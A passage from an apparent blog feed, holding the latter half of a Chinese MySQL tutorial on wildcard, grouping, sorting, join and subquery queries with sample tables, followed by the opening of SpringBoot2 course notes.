&#39;%s%&#39;;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210302203828429.png" alt="在这里插入图片描述"></p><h3 id="7-3-含有-通配的字符串"><a href="#7-3-含有-通配的字符串" class="headerlink" title="7.3 含有_通配的字符串"></a>7.3 含有_通配的字符串</h3><p>下划线通配符只匹配单个字符，如果要匹配多个字符，需要连续使用多个下划线通配符。例如，字符串“ab_”匹配以字符串“ab”开始长度为3的字符串，如abc、abp等等；字符串“a__d”匹配在字符“a”和“d”之间包含两个字符的字符串，如”abcd”、”atud”等等。<br>查询学生姓名以zx开头且长度为4的记录 MySQL命令：</p><p>​    <code>select * from student where sname like &#39;zx__&#39;;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210302204051494.png" alt="在这里插入图片描述"></p><p>查询学生姓名以g结尾且长度为4的记录 MySQL命令：</p><p>​    <code>select * from student where sname like &#39;___g&#39;;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210302204240798.png" alt="在这里插入图片描述"></p><h2 id="8-使用LIMIT限制查询结果的数量"><a href="#8-使用LIMIT限制查询结果的数量" class="headerlink" title="8.使用LIMIT限制查询结果的数量"></a>8.使用LIMIT限制查询结果的数量</h2><p>当执行查询数据时可能会返回很多条记录，而用户需要的数据可能只是其中的一条或者几条<br>查询学生表中年纪最小的3位同学 MySQL命令：</p><p>​    <code>select * from student order by age asc limit 3;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210302204847986.png" alt="在这里插入图片描述"></p><h2 id="9-使用GROUP-BY进行分组查询"><a href="#9-使用GROUP-BY进行分组查询" class="headerlink" title="9.使用GROUP BY进行分组查询"></a>9.使用GROUP BY进行分组查询</h2><p>GROUP BY 子句可像切蛋糕一样将表中的数据进行分组，再进行查询等操作。换言之，可通俗地理解为：通过GROUP BY将原来的表拆分成了几张小表。<br>接下来，我们通过一个例子开始学习GROUP BY，代码如下</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 创建数据库<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- 创建员工表<br>CREATE TABLE employee (<br>    id int,<br>    name varchar(50),<br>    salary int,<br>    departmentnumber int<br>);<br><br>-- 向员工表中插入数据<br>INSERT INTO employee values(1,&#x27;tome&#x27;,2000,1001); <br>INSERT INTO employee values(2,&#x27;lucy&#x27;,9000,1002); <br>INSERT INTO employee values(3,&#x27;joke&#x27;,5000,1003); <br>INSERT INTO employee values(4,&#x27;wang&#x27;,3000,1004); <br>INSERT INTO employee values(5,&#x27;chen&#x27;,3000,1001); <br>INSERT INTO employee values(6,&#x27;yukt&#x27;,7000,1002); <br>INSERT INTO employee values(7,&#x27;rett&#x27;,6000,1003); <br>INSERT INTO employee values(8,&#x27;mujk&#x27;,4000,1004); <br>INSERT INTO employee values(9,&#x27;poik&#x27;,3000,1001);<br><br></code></pre></td></tr></table></figure><h3 id="9-1-GROUP-BY和聚合函数一起使用"><a href="#9-1-GROUP-BY和聚合函数一起使用" class="headerlink" title="9.1 GROUP BY和聚合函数一起使用"></a>9.1 GROUP BY和聚合函数一起使用</h3><p>统计各部门员工个数 MySQL命令：</p><p>​    <code>select count(*), departmentnumber from employee group by departmentnumber;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/2021030220555769.png" alt="在这里插入图片描述"><br>统计部门编号大于1001的各部门员工个数 MySQL命令：</p><p>​    <code>select count(*), departmentnumber from employee where departmentnumber&gt;1001 group by departmentnumber;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210302210134682.png" alt="在这里插入图片描述"></p><h3 id="9-2-GROUP-BY和聚合函数以及HAVING一起使用"><a href="#9-2-GROUP-BY和聚合函数以及HAVING一起使用" class="headerlink" title="9.2 GROUP BY和聚合函数以及HAVING一起使用"></a>9.2 GROUP BY和聚合函数以及HAVING一起使用</h3><p>统计工资总和大于8000的部门 MySQL命令：</p><p>​    <code>select sum(salary),departmentnumber from employee group by departmentnumber having sum(salary)&gt;8000;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210302210627962.png" alt="在这里插入图片描述"></p><h2 id="10-使用ORDER-BY对查询结果排序"><a href="#10-使用ORDER-BY对查询结果排序" class="headerlink" title="10.使用ORDER BY对查询结果排序"></a>10.使用ORDER BY对查询结果排序</h2><p>从表中査询出来的数据可能是无序的或者其排列顺序不是我们期望的。为此，我们可以使用ORDER BY对查询结果进行排序<br>其语法格式如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT 字段名1,字段名2,…<br>FROM 表名<br>ORDER BY 字段名1 [ASC 丨 DESC],字段名2 [ASC | DESC];<br></code></pre></td></tr></table></figure><p>在该语法中：字段名1、字段名2是查询结果排序的依据；参数<br>ASC表示按照升序排序，DESC表示按照降序排序；默认情况下，按照ASC方式排序。通常情况下，ORDER BY子句位于整个SELECT语句的末尾。<br>查询所有学生并按照年纪大小升序排列 MySQL命令：</p><p>​    <code>select * from student order by age asc;</code></p><p>运行效果展示<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030221134859.png" alt="在这里插入图片描述"><br>查询所有学生并按照年纪大小降序排列 MySQL命令：</p><p>​    <code>select * from student order by age desc;</code></p><p>运行效果展示<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302211454223.png" alt="在这里插入图片描述"></p><h1 id="十二、别名设置"><a href="#十二、别名设置" class="headerlink" title="十二、别名设置"></a>十二、别名设置</h1><p>在査询数据时可为表和字段取別名，该别名代替表和字段的原名参与查询操作。<br><strong>操作的表事先已准备</strong></p><h2 id="1-为表取别名"><a href="#1-为表取别名" class="headerlink" title="1.为表取别名"></a>1.为表取别名</h2><p>在查询操作时，假若表名很长使用起来就不太方便，此时可为表取一个別名，用该别名来代替表的名称。语法格式如下所示：</p><p>​    <strong>SELECT * FROM 表名 [AS] 表的别名 WHERE …. ;</strong></p><p>将student改为stu查询整表 MySQL命令：</p><p>​    <code>select * from student as stu;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210303192155711.png" alt="在这里插入图片描述"></p><h2 id="2-为字段取别名"><a href="#2-为字段取别名" class="headerlink" title="2.为字段取别名"></a>2.为字段取别名</h2><p>在查询操作时，假若字段名很长使用起来就不太方便，此时可该字段取一个別名，用该别名来代替字段的名称。语法格式如下所示：</p><p>​    <strong>SELECT 字段名1 [AS] 别名1 , 字段名2 [AS] 别名2 , … FROM 表名 WHERE … ;</strong></p><p>将student中的name取别名为“姓名” 查询整表 MySQL命令：</p><p>​    <code>select name as &#39;姓名&#39;,id from student;</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/2021030319253113.png" alt="在这里插入图片描述"></p><h1 id="十三、表的关联关系"><a href="#十三、表的关联关系" class="headerlink" title="十三、表的关联关系"></a>十三、表的关联关系</h1><p>在实际开发中数据表之间存在着各种关联关系。在此，介绍MySQL中数据表的三种关联关系。<br><strong>多对一</strong><br>多对一(亦称为一对多)是数据表中最常见的一种关系。例如：员工与部门之间的关系，一个部门可以有多个员工；而一个员工不能属于多个部门只属于某个部门。在多对一的表关系<br>中，应将外键建在多的一方否则会造成数据的冗余。<br><strong>多对多</strong><br>多对多是数据表中常见的一种关系。例如：学生与老师之间的关系，一个学生可以有多个老师而且一个老师有多个学生。通常情况下，为了实现这种关系需要定义一张中间表(亦称为连接表)该表会存在两个外键分别参照老师表和学生表。<br><strong>一对一</strong><br>在开发过程中，一对一的关联关系在数据库中并不常见；因为以这种方式存储的信息通常会放在同一张表中。<br>接下来，我们来学习在一对多的关联关系中如果添加和删除数据。先准备一些测试数据，代码如下：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP TABLE IF EXISTS student;<br>DROP TABLE IF EXISTS class;<br><br>-- 创建班级表<br>CREATE TABLE class(<br>    cid int(4) NOT NULL PRIMARY KEY,<br>    cname varchar(30) <br>);<br><br>-- 创建学生表<br>CREATE TABLE student(<br>    sid int(8) NOT NULL PRIMARY KEY,<br>    sname varchar(30),<br>    classid int(8) NOT NULL<br>);<br><br>-- 为学生表添加外键约束<br>ALTER TABLE student ADD CONSTRAINT fk_student_classid FOREIGN KEY(classid) REFERENCES class(cid);<br>-- 向班级表插入数据<br>INSERT INTO class(cid,cname)VALUES(1,&#x27;Java&#x27;);<br>INSERT INTO class(cid,cname)VALUES(2,&#x27;Python&#x27;);<br><br>-- 向学生表插入数据<br>INSERT INTO student(sid,sname,classid)VALUES(1,&#x27;tome&#x27;,1);<br>INSERT INTO student(sid,sname,classid)VALUES(2,&#x27;lucy&#x27;,1);<br>INSERT INTO student(sid,sname,classid)VALUES(3,&#x27;lili&#x27;,2);<br>INSERT INTO student(sid,sname,classid)VALUES(4,&#x27;domi&#x27;,2);<br><br></code></pre></td></tr></table></figure><h2 id="1-关联查询"><a href="#1-关联查询" class="headerlink" title="1.关联查询"></a>1.关联查询</h2><p>查询Java班的所有学生 MySQL命令：</p><p>​    <code>select * from student where classid=(select cid from class where cname=&#39;Java&#39;);</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/2021030319330865.png" alt="在这里插入图片描述"></p><h2 id="2-关于关联关系的删除数据"><a href="#2-关于关联关系的删除数据" class="headerlink" title="2.关于关联关系的删除数据"></a>2.关于关联关系的删除数据</h2><p>请从班级表中删除Java班级。在此，请注意：班级表和学生表之间存在关联关系；要删除Java班级，应该先删除学生表中与该班相关联的学生。否则，假若先删除Java班那么学生表中的cid就失去了关联<br>删除Java班 MySQL命令：</p><p>​    <code>delete from student where classid=(select cid from class where cname=&#39;Java&#39;);</code><br><code>​    delete from class where cname=&#39;Java&#39;;</code></p><p>运行效果展示<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030319415767.png" alt="在这里插入图片描述"></p><h1 id="十四、多表连接查询"><a href="#十四、多表连接查询" class="headerlink" title="十四、多表连接查询"></a>十四、多表连接查询</h1><h2 id="1-交叉连接查询"><a href="#1-交叉连接查询" class="headerlink" title="1.交叉连接查询"></a>1.交叉连接查询</h2><p>交叉连接返回的结果是被连接的两个表中所有数据行的笛卡儿积；比如：集合A&#x3D;{a,b}，集合B&#x3D;{0,1,2}，则集合A和B的笛卡尔积为{(a,0),(a,1),(a,2),(b,0),(b,1),(b,2)}。所以，交叉连接也被称为笛卡尔连接，其语法格式如下：</p><p>​    <strong>SELECT * FROM 表1 CROSS JOIN 表2;</strong></p><p>在该语法中：CROSS JOIN用于连接两个要查询的表，通过该语句可以查询两个表中所有的数据组合。<br><strong>由于这个交叉连接查询在实际运用中没有任何意义 ，所以只做为了解即可</strong></p><h2 id="2-内连接查询"><a href="#2-内连接查询" class="headerlink" title="2.内连接查询"></a>2.内连接查询</h2><p>内连接(Inner<br>Join)又称简单连接或自然连接，是一种非常常见的连接查询。内连接使用比较运算符对两个表中的数据进行比较并列出与连接条件匹配的数据行，组合成新的<br>记录。也就是说在内连接查询中只有满足条件的记录才能出现在查询结果中。其语法格式如下：</p><p>​<br>​    SELECT 查询字段1,查询字段2, … FROM 表1 [INNER] JOIN 表2 ON 表1.关系字段&#x3D;表2.关系字段</p><p>在该语法中：INNER JOIN用于连接两个表，ON来指定连接条件；其中INNER可以省略。</p><p>准备数据，代码如下：</p><p>查询员工姓名及其所属部门名称 MySQL命令：</p><p>​<br>​    select employee.ename,department.dname from department inner join employee on department.did&#x3D;employee.departmentid;</p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/2021030320040897.png" alt="在这里插入图片描述"></p><h2 id="3-外连接查询"><a href="#3-外连接查询" class="headerlink" title="3.外连接查询"></a>3.外连接查询</h2><p>在使用内连接查询时我们发现：返回的结果只包含符合查询条件和连接条件的数据。但是，有时还需要在返回查询结果中不仅包含符合条件的数据，而且还包括左表、右表或两个表中的所有数据，此时我们就需要使用外连接查询。外连接又分为左(外)连接和右(外)连接。其语法格式如下：</p><p>​    SELECT 查询字段1,查询字段2, … FROM 表1 LEFT | RIGHT [OUTER] JOIN 表2 ON 表1.关系字段&#x3D;表2.关系字段 WHERE 条件</p><p>由此可见，外连接的语法格式和内连接非常相似，只不过使用的是LEFT [OUTER] JOIN、RIGHT [OUTER]<br>JOIN关键字。其中，关键字左边的表被称为左表，关键字右边的表被称为右表；OUTER可以省略。<br>在使用左(外)连接和右(外)连接查询时，查询结果是不一致的，具体如下：<br>**1、LEFT [OUTER] JOIN 左(外)连接 ：返回包括左表中的所有记录和右表中符合连接条件的记录。 ** </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT 查询字段1,查询字段2, ... FROM 表1 LEFT | RIGHT [OUTER] JOIN 表2 ON 表1.关系字段=表2.关系字段 WHERE 条件<br><br></code></pre></td></tr></table></figure><p><strong>2、RIGHT [OUTER] JOIN 右(外)连接：返回包括右表中的所有记录和左表中符合连接条件的记录。</strong></p><p>先准备数据，代码如下：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 若存在数据库mydb则删除<br>DROP DATABASE IF EXISTS mydb;<br>-- 创建数据库mydb<br>CREATE DATABASE mydb;<br>-- 选择数据库mydb<br>USE mydb;<br><br>-- 创建班级表<br>CREATE TABLE class(<br>  cid int (4) NOT NULL PRIMARY KEY, <br>  cname varchar(20)<br>);<br><br>-- 创建学生表<br>CREATE TABLE student (<br>  sid int (4) NOT NULL PRIMARY KEY, <br>  sname varchar (20), <br>  sage int (2), <br>  classid int (4) NOT NULL<br>);<br>-- 向班级表插入数据<br>INSERT INTO class VALUES(1001,&#x27;Java&#x27;);<br>INSERT INTO class VALUES(1002,&#x27;C++&#x27;);<br>INSERT INTO class VALUES(1003,&#x27;Python&#x27;);<br>INSERT INTO class VALUES(1004,&#x27;PHP&#x27;);<br><br>-- 向学生表插入数据<br>INSERT INTO student VALUES(1,&#x27;张三&#x27;,20,1001);<br>INSERT INTO student VALUES(2,&#x27;李四&#x27;,21,1002);<br>INSERT INTO student VALUES(3,&#x27;王五&#x27;,24,1002);<br>INSERT INTO student VALUES(4,&#x27;赵六&#x27;,23,1003);<br>INSERT INTO student VALUES(5,&#x27;Jack&#x27;,22,1009);<br><br></code></pre></td></tr></table></figure><p><em>准备这组数据有一定的特点 ，为的是让大家直观的看出左连接与右连接的不同之处<br>1、班级编号为1004的PHP班级没有学生<br>2、学号为5的学生王跃跃班级编号为1009，该班级编号并不在班级表中</em></p><h3 id="3-1-左（外）连接查询"><a href="#3-1-左（外）连接查询" class="headerlink" title="3.1 左（外）连接查询"></a>3.1 左（外）连接查询</h3><p>左(外)连接的结果包括LEFT JOIN子句中指定的左表的所有记录，以及所有满足连接条件的记录。如果左表的某条记录在右表中不存在则在右表中显示为空。<br>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p><p>​    <code>select class.cid,class.cname,student.sname from class left outer join student on class.cid=student.classid;</code></p><p>运行效果展示<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303201647123.png" alt="在这里插入图片描述"><br>展示结果分析：<br>1、分别找出Java班、C++班、Python班的学生<br>2、右表的王跃跃不满足查询条件故其没有出现在查询结果中<br>3、虽然左表的PHP班没有学生，但是任然显示了PHP的信息；但是，它对应的学生名字为NULL</p><h3 id="3-2-右（外）连接查询"><a href="#3-2-右（外）连接查询" class="headerlink" title="3.2 右（外）连接查询"></a>3.2 右（外）连接查询</h3><p>右(外)连接的结果包括RIGHT JOIN子句中指定的右表的所有记录，以及所有满足连接条件的记录。如果右表的某条记录在左表中没有匹配，则左表将返回空值。<br>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p><p>​    <code>select class.cid,class.cname,student.sname from class right outer join student on class.cid=student.classid;</code></p><p>运行效果展示<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303202037216.png" alt="在这里插入图片描述"><br>展示结果分析：<br>1、分别找出Java班、C++班、Python班的学生<br>2、左表的PHP班不满足查询条件故其没有出现在查询结果中<br>3、虽然右表的jack没有对应班级，但是任然显示王跃跃的信息；但是，它对应的班级以及班级编号均为NULL</p><h1 id="十五、子查询"><a href="#十五、子查询" class="headerlink" title="十五、子查询"></a>十五、子查询</h1><p>子查询是指一个查询语句嵌套在另一个查询语句内部的查询；该查询语句可以嵌套在一个<br>SELECT、SELECT…INTO、INSERT…INTO等语句中。在执行查询时，首先会执行子查询中的语句，再将返回的结果作为外层查询的过滤条件。在子査询中通常可以使用比较运算符和IN、EXISTS、ANY、ALL等关键字。</p><p>准备数据，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP TABLE IF EXISTS student;<br>DROP TABLE IF EXISTS class;<br><br>-- 创建班级表<br>CREATE TABLE class(<br>  cid int (4) NOT NULL PRIMARY KEY, <br>  cname varchar(20)<br>);<br><br>-- 创建学生表<br>CREATE TABLE student (<br>  sid int (4) NOT NULL PRIMARY KEY, <br>  sname varchar (20), <br>  sage int (2), <br>  classid int (4) NOT NULL<br>);<br><br>-- 向班级表插入数据<br>INSERT INTO class VALUES(1001,&#x27;Java&#x27;);<br>INSERT INTO class VALUES(1002,&#x27;C++&#x27;);<br>INSERT INTO class VALUES(1003,&#x27;Python&#x27;);<br>INSERT INTO class VALUES(1004,&#x27;PHP&#x27;);<br>INSERT INTO class VALUES(1005,&#x27;Android&#x27;);<br><br>-- 向学生表插入数据<br>INSERT INTO student VALUES(1,&#x27;张三&#x27;,20,1001);<br>INSERT INTO student VALUES(2,&#x27;李四&#x27;,21,1002);<br>INSERT INTO student VALUES(3,&#x27;王五&#x27;,24,1003);<br>INSERT INTO student VALUES(4,&#x27;赵六&#x27;,23,1004);<br>INSERT INTO student VALUES(5,&#x27;小明&#x27;,21,1001);<br>INSERT INTO student VALUES(6,&#x27;小红&#x27;,26,1001);<br>INSERT INTO student VALUES(7,&#x27;小亮&#x27;,27,1002);<br><br></code></pre></td></tr></table></figure><h2 id="1-带比较运算符的子查询"><a href="#1-带比较运算符的子查询" class="headerlink" title="1.带比较运算符的子查询"></a>1.带比较运算符的子查询</h2><p>比较运算符前面我们提到过得，就是&gt;、&lt;、&#x3D;、&gt;&#x3D;、&lt;&#x3D;、!&#x3D;等<br>查询张三同学所在班级的信息 MySQL命令：</p><p>​    <code>select * from class where cid=(select classid from student where sname=&#39;张三&#39;);</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/2021030320275492.png" alt="在这里插入图片描述"><br>查询比张三同学所在班级编号还大的班级的信息 MySQL命令：</p><p>​    <code>select * from class where cid&gt;(select classid from student where sname=&#39;张三&#39;);</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210303203231622.png" alt="在这里插入图片描述"></p><h2 id="2-带EXISTS关键字的子查询"><a href="#2-带EXISTS关键字的子查询" class="headerlink" title="2.带EXISTS关键字的子查询"></a>2.带EXISTS关键字的子查询</h2><p>EXISTS关键字后面的参数可以是任意一个子查询， 它不产生任何数据只返回TRUE或FALSE。当返回值为TRUE时外层查询才会 执行<br>假如王五同学在学生表中则从班级表查询所有班级信息 MySQL命令：</p><p>​    <code>select * from class where exists (select * from student where sname=&#39;王五&#39;);</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210303203707252.png" alt="在这里插入图片描述"></p><h2 id="3-带ANY关键字的子查询"><a href="#3-带ANY关键字的子查询" class="headerlink" title="3.带ANY关键字的子查询"></a>3.带ANY关键字的子查询</h2><p>ANY关键字表示满足其中任意一个条件就返回一个结果作为外层查询条件。</p><p>查询比任一学生所属班级号还大的班级编号 MySQL命令：</p><p>​    <code>select * from class where cid &gt; any (select classid from student);</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210303204057530.png" alt="在这里插入图片描述"></p><h2 id="4-带ALL关键字的子查询"><a href="#4-带ALL关键字的子查询" class="headerlink" title="4.带ALL关键字的子查询"></a>4.带ALL关键字的子查询</h2><p>ALL关键字与ANY有点类似，只不过带ALL关键字的子査询返回的结果需同时满足所有内层査询条件。</p><p>查询比所有学生所属班级号还大的班级编号 MySQL命令：</p><p>​    <code>select * from class where cid &gt; all (select classid from student);</code></p><p>运行效果展示<br><img src="https://img-blog.csdnimg.cn/20210303204447489.png" alt="在这里插入图片描述"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>重要</strong> （从关键字分析）：<br><strong>查询语句的书写顺序和执行顺序</strong><br>select &#x3D;&#x3D;&#x3D;&gt; from &#x3D;&#x3D;&#x3D;&gt; where &#x3D;&#x3D;&#x3D;&gt; group by &#x3D;&#x3D;&#x3D;&gt; having &#x3D;&#x3D;&#x3D;&gt; order by &#x3D;&#x3D;&#x3D;&gt; limit<br><strong>查询语句的执行顺序</strong><br>from &#x3D;&#x3D;&#x3D;&gt; where &#x3D;&#x3D;&#x3D;&gt; group by &#x3D;&#x3D;&#x3D;&gt; having &#x3D;&#x3D;&#x3D;&gt; select &#x3D;&#x3D;&#x3D;&gt; order by &#x3D;&#x3D;&#x3D;&gt; limi</p><p>基于复习，乐于分享 所以有了这篇文章！！！<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303204835945.png" alt="在这里插入图片描述"></p><p><a href="https://blog.csdn.net/weixin_45851945/article/details/114287877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166815555416800186564683%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166815555416800186564683&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-4-114287877-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol_1,213%5Ev2%5Et3_esquery_v2&utm_term=mysql&spm=1018.2226.3001.4187">原文链接</a></p>]]></content>
    
    
    <categories>
      
      <category>Database</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot2_尚硅谷</title>
    <link href="/2022/11/22/SpringBoot2_%E5%B0%9A%E7%A1%85%E8%B0%B7/"/>
    <url>/2022/11/22/SpringBoot2_%E5%B0%9A%E7%A1%85%E8%B0%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringBoot2核心技术-基础入门"><a href="#SpringBoot2核心技术-基础入门" class="headerlink" title="SpringBoot2核心技术-基础入门"></a>SpringBoot2核心技术-基础入门</h1><h2 id="01、基础入门-SpringBoot2课程介绍"><a href="#01、基础入门-SpringBoot2课程介绍" class="headerlink" title="01、基础入门-SpringBoot2课程介绍"></a>01、基础入门-SpringBoot2课程介绍</h2><ol><li><p>Spring Boot 2核心技术</p></li><li><p>Spring Boot 2响应式编程</p></li></ol><ul><li>学习要求<br>-熟悉Spring基础<br>-熟悉Maven使用</li><li>环境要求<ul><li>Java8及以上</li><li>Maven 3.3及以上</li></ul></li><li>学习资料<ul><li><a href="https://spring.io/projects/spring-boot">Spring Boot官网</a></li><li><a href="https://docs.spring.io/spring-boot/docs/">Spring Boot官方文档</a></li><li><a href="https://www.yuque.com/atguigu/springboot">本课程文档地址</a></li><li><a href="http://www.gulixueyuan.com/">视频地址1</a>、<a href="https://www.bilibili.com/video/BV19K4y1L7MT?p=1">视频地址2</a></li><li><a href="https://gitee.com/leifengyang/springboot2">源码地址</a></li></ul></li></ul><h2 id="02、基础入门-Spring生态圈"><a href="#02、基础入门-Spring生态圈" class="headerlink" title="02、基础入门-Spring生态圈"></a>02、基础入门-Spring生态圈</h2><p><a href="https://spring.io/">Spring官网</a></p><h3 id="Spring能做什么"><a href="#Spring能做什么" class="headerlink" title="Spring能做什么"></a>Spring能做什么</h3><h4 id="Spring的能力"><a href="#Spring的能力" class="headerlink" title="Spring的能力"></a>Spring的能力</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211322434.png" alt="在这里插入图片描述"></p><h4 id="Spring的生态"><a href="#Spring的生态" class="headerlink" title="Spring的生态"></a>Spring的生态</h4><p>覆盖了：</p><ul><li>web开发</li><li>数据访问</li><li>安全控制</li><li>分布式</li><li>消息服务</li><li>移动开发</li><li>批处理</li><li>……</li></ul><h4 id="Spring5重大升级"><a href="#Spring5重大升级" class="headerlink" title="Spring5重大升级"></a>Spring5重大升级</h4><ul><li>响应式编程</li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004250581.png" alt="在这里插入图片描述"></p><ul><li>内部源码设计</li></ul><p>基于Java8的一些新特性，如：接口默认实现。重新设计源码架构。</p><h3 id="为什么用SpringBoot"><a href="#为什么用SpringBoot" class="headerlink" title="为什么用SpringBoot"></a>为什么用SpringBoot</h3><blockquote><p>Spring Boot makes it easy to create stand-alone, production-grade Spring based Applications that you can “just run”.<a href="https://spring.io/projects/spring-boot">link</a></p><p>能快速创建出生产级别的Spring应用。</p></blockquote><h4 id="SpringBoot优点"><a href="#SpringBoot优点" class="headerlink" title="SpringBoot优点"></a>SpringBoot优点</h4><ul><li><p>Create stand-alone Spring applications</p><ul><li>创建独立Spring应用</li></ul></li><li><p>Embed Tomcat, Jetty or Undertow directly (no need to deploy WAR files)</p><ul><li>内嵌web服务器</li></ul></li><li><p>Provide opinionated ‘starter’ dependencies to simplify your build configuration</p><ul><li>自动starter依赖，简化构建配置</li></ul></li><li><p>Automatically configure Spring and 3rd party libraries whenever possible</p><ul><li>自动配置Spring以及第三方功能</li></ul></li><li><p>Provide production-ready features such as metrics, health checks, and externalized configuration</p><ul><li>提供生产级别的监控、健康检查及外部化配置</li></ul></li><li><p>Absolutely no code generation and no requirement for XML configuration</p><ul><li>无代码生成、无需编写XML</li></ul></li><li><p>SpringBoot是整合Spring技术栈的一站式框架</p></li><li><p>SpringBoot是简化Spring技术栈的快速开发脚手架</p></li></ul><h4 id="SpringBoot缺点"><a href="#SpringBoot缺点" class="headerlink" title="SpringBoot缺点"></a>SpringBoot缺点</h4><ul><li>人称版本帝，迭代快，需要时刻关注变化</li><li>封装太深，内部原理复杂，不容易精通</li></ul><h2 id="03、基础入门-SpringBoot的大时代背景"><a href="#03、基础入门-SpringBoot的大时代背景" class="headerlink" title="03、基础入门-SpringBoot的大时代背景"></a>03、基础入门-SpringBoot的大时代背景</h2><h3 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h3><blockquote><p>In short, the <strong>microservice architectural style</strong> is an approach to developing a single application as a <strong>suite of small services</strong>, each <strong>running in its own process</strong> and communicating with <strong>lightweight</strong> mechanisms, often an <strong>HTTP</strong> resource API. These services are built around <strong>business capabilities</strong> and <strong>independently deployable</strong> by fully <strong>automated deployment</strong> machinery. There is a bare minimum of centralized management of these services, which may be <strong>written in different programming languages</strong> and use different data storage technologies.——<a 